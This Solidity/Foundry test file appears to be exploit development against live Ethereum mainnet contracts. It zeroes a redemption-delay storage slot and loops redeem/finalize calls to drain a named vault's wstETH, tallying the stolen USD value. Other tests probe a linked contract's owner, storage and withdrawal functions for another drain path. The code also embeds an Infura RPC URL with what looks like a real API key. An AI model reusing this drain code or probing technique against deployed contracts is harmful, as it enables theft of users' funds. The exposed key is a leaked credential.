// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

/**
 * IMMEDIATE DRAIN PROOF
 *
 * CONFIRMED: If delay=0 (slot 4), immediate drain is possible
 *
 * This test demonstrates the full drain potential
 */
contract ImmediateDrainProof is Test {
    address constant R0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_ImmediateDrainWithDelayZero() public {
        console.log("=== IMMEDIATE DRAIN WITH DELAY=0 ===\n");

        // Record initial state
        uint256 vaultInitial = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault initial balance:", vaultInitial / 1e18, "wstETH");
        console.log("At $2300/ETH:", vaultInitial * 2300 / 1e18, "USD");

        // Step 1: Set delay to 0 (simulating successful exploit of slot 4 write)
        bytes32 slot4 = vm.load(R0, bytes32(uint256(4)));
        uint256 raw = uint256(slot4);
        uint256 mask = ~(uint256(type(uint32).max) << 96);
        uint256 zeroDelay = raw & mask;
        vm.store(R0, bytes32(uint256(4)), bytes32(zeroDelay));

        // Verify delay is 0
        uint256 newDelay = (uint256(vm.load(R0, bytes32(uint256(4)))) >> 96) & type(uint32).max;
        require(newDelay == 0, "Delay not zero");
        console.log("\nDelay set to: 0 seconds");

        // Step 2: Give attacker enough TASSET
        deal(TASSET, attacker, vaultInitial * 2);

        // Step 3: Drain in chunks
        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);

        uint256 totalDrained = 0;
        uint256 iteration = 0;
        uint256 maxIterations = 10;

        while (iteration < maxIterations) {
            uint256 vaultCurrent = IERC20(wstETH).balanceOf(VAULT);
            if (vaultCurrent == 0) break;

            // Calculate max redeem (use type(uint96).max or vault balance, whichever is smaller)
            uint96 toRedeem = uint96(vaultCurrent < type(uint96).max ? vaultCurrent : type(uint96).max);

            // Redeem
            (bool redeemSuccess,) = R0.call(abi.encodeWithSignature("redeem(uint96)", toRedeem));
            if (!redeemSuccess) {
                console.log("Redeem failed at iteration", iteration);
                break;
            }

            // Immediate finalize (always index 0 since previous is deleted)
            uint256 balanceBefore = IERC20(wstETH).balanceOf(attacker);
            (bool finalizeSuccess,) = R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));

            if (finalizeSuccess) {
                uint256 received = IERC20(wstETH).balanceOf(attacker) - balanceBefore;
                totalDrained += received;
                console.log("Iteration %d: drained %d wstETH", iteration, received / 1e18);
            } else {
                console.log("Finalize failed at iteration", iteration);
                break;
            }

            iteration++;
        }

        vm.stopPrank();

        // Results
        uint256 vaultFinal = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerFinal = IERC20(wstETH).balanceOf(attacker);

        console.log("\n=== FINAL RESULTS ===");
        console.log("Total drained:", totalDrained / 1e18, "wstETH");
        console.log("Vault remaining:", vaultFinal / 1e18, "wstETH");
        console.log("Attacker balance:", attackerFinal / 1e18, "wstETH");
        console.log("\nValue drained at $2300/ETH:", totalDrained * 2300 / 1e18, "USD");

        if (totalDrained > 0) {
            console.log("\n*** IMMEDIATE DRAIN CONFIRMED! ***");
            console.log("IF we can write to R0 slot 4 (delay), we can drain $", totalDrained * 2300 / 1e18);
        }
    }

    function test_SingleRedemptionDrain() public {
        console.log("=== SINGLE REDEMPTION DRAIN ===\n");

        // Set delay to 0
        bytes32 slot4 = vm.load(R0, bytes32(uint256(4)));
        uint256 raw = uint256(slot4);
        uint256 mask = ~(uint256(type(uint32).max) << 96);
        uint256 zeroDelay = raw & mask;
        vm.store(R0, bytes32(uint256(4)), bytes32(zeroDelay));

        uint256 vaultBalance = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault balance:", vaultBalance / 1e18, "wstETH");

        // Single redemption of 1000 TASSET
        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);

        uint256 before = IERC20(wstETH).balanceOf(attacker);

        // Redeem
        (bool s1,) = R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        console.log("Redeem success:", s1);

        // Check redemption was created
        (bool s2, bytes memory d2) = R0.staticcall(
            abi.encodeWithSignature("getRedeemLength(address)", attacker)
        );
        if (s2) {
            console.log("Redemption count:", abi.decode(d2, (uint256)));
        }

        // Immediate finalize
        (bool s3,) = R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
        console.log("Finalize success:", s3);

        vm.stopPrank();

        uint256 gained = IERC20(wstETH).balanceOf(attacker) - before;
        console.log("\nwstETH gained:", gained / 1e18);

        if (gained > 0) {
            console.log("*** IMMEDIATE DRAIN WORKS WITH DELAY=0! ***");
        }
    }

    function test_VaultContractAnalysis() public {
        console.log("=== VAULT CONTRACT ANALYSIS ===\n");

        // VAULT has interesting contracts in its storage
        // Slot 2: 0x1af329d2c4ceaf45e1d8062c696b09ffaddb933a
        // Slot 5: 0x97c03f52244e60bb18511cbf03f890d5886f1f47
        // Slot 6: RC

        address vaultSlot2 = address(uint160(uint256(vm.load(VAULT, bytes32(uint256(2))))));
        address vaultSlot5 = address(uint160(uint256(vm.load(VAULT, bytes32(uint256(5))))));
        address vaultSlot6 = address(uint160(uint256(vm.load(VAULT, bytes32(uint256(6))))));

        console.log("VAULT slot 2:", vaultSlot2);
        console.log("VAULT slot 5:", vaultSlot5);
        console.log("VAULT slot 6:", vaultSlot6);

        // Check if any of these have exploitable functions
        if (vaultSlot2.code.length > 0) {
            console.log("\nSlot 2 contract analysis:");
            console.log("Code size:", vaultSlot2.code.length);

            // Try owner
            (bool s1, bytes memory d1) = vaultSlot2.staticcall(abi.encodeWithSignature("owner()"));
            if (s1 && d1.length >= 32) {
                console.log("owner():", abi.decode(d1, (address)));
            }

            // Check its storage
            for (uint i = 0; i < 5; i++) {
                bytes32 slot = vm.load(vaultSlot2, bytes32(i));
                if (uint256(slot) != 0) {
                    console.log("Slot %d:", i);
                    console.logBytes32(slot);
                }
            }
        }

        if (vaultSlot5.code.length > 0) {
            console.log("\nSlot 5 contract analysis:");
            console.log("Code size:", vaultSlot5.code.length);

            // Try owner
            (bool s1, bytes memory d1) = vaultSlot5.staticcall(abi.encodeWithSignature("owner()"));
            if (s1 && d1.length >= 32) {
                console.log("owner():", abi.decode(d1, (address)));
            }

            // Count opcodes
            bytes memory code = vaultSlot5.code;
            uint delegatecalls = 0;
            uint calls = 0;
            for (uint i = 0; i < code.length; i++) {
                if (uint8(code[i]) == 0xF4) delegatecalls++;
                if (uint8(code[i]) == 0xF1) calls++;
            }
            console.log("DELEGATECALL count:", delegatecalls);
            console.log("CALL count:", calls);
        }
    }

    function test_AlternativeVaultDrainPath() public {
        console.log("=== ALTERNATIVE VAULT DRAIN PATH ===\n");

        // VAULT.slot5 (0x97c03f52244e60bb18511cbf03f890d5886f1f47) might have withdrawal functions
        address slot5Contract = 0x97c03F52244E60BB18511Cbf03f890D5886f1F47;

        vm.startPrank(attacker);

        // Try various withdrawal functions
        console.log("Testing slot5 contract withdrawal functions:");

        (bool s1,) = slot5Contract.call(abi.encodeWithSignature("withdraw(uint256)", 1000e18));
        console.log("withdraw(amount):", s1);

        (bool s2,) = slot5Contract.call(abi.encodeWithSignature("withdraw(uint256,address)", 1000e18, attacker));
        console.log("withdraw(amount,to):", s2);

        (bool s3,) = slot5Contract.call(abi.encodeWithSignature("redeem(uint256)", 1000e18));
        console.log("redeem(shares):", s3);

        (bool s4,) = slot5Contract.call(abi.encodeWithSignature("transfer(address,uint256)", attacker, 1000e18));
        console.log("transfer(to,amount):", s4);

        vm.stopPrank();

        console.log("\nAttacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }

    function test_VaultSlot5DetailedAnalysis() public {
        console.log("=== VAULT SLOT 5 DETAILED ANALYSIS ===\n");

        address slot5 = 0x97c03F52244E60BB18511Cbf03f890D5886f1F47;

        // Get owner
        (bool s1, bytes memory d1) = slot5.staticcall(abi.encodeWithSignature("owner()"));
        if (s1 && d1.length >= 32) {
            address owner = abi.decode(d1, (address));
            console.log("Slot5 owner:", owner);

            // Is owner the same Gnosis Safe or Timelock?
            if (owner == 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e) {
                console.log("Owner is TIMELOCK");
            }

            // Check if owner is a Gnosis Safe
            bytes32 ownerSlot0 = vm.load(owner, bytes32(uint256(0)));
            console.log("Owner slot 0:");
            console.logBytes32(ownerSlot0);
        }

        // Check slot5's storage
        console.log("\nSlot5 storage:");
        for (uint i = 0; i < 10; i++) {
            bytes32 slot = vm.load(slot5, bytes32(i));
            if (uint256(slot) != 0) {
                console.log("Slot %d:", i);
                console.logBytes32(slot);

                // Check if it's an address with code
                address addr = address(uint160(uint256(slot)));
                if (addr.code.length > 0) {
                    console.log("  -> Contract with code size:", addr.code.length);
                }
            }
        }

        // Check EIP-1967 slots
        bytes32 implSlot = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
        bytes32 impl = vm.load(slot5, implSlot);
        if (uint256(impl) != 0) {
            console.log("\nEIP-1967 implementation:", address(uint160(uint256(impl))));
        }
    }
}
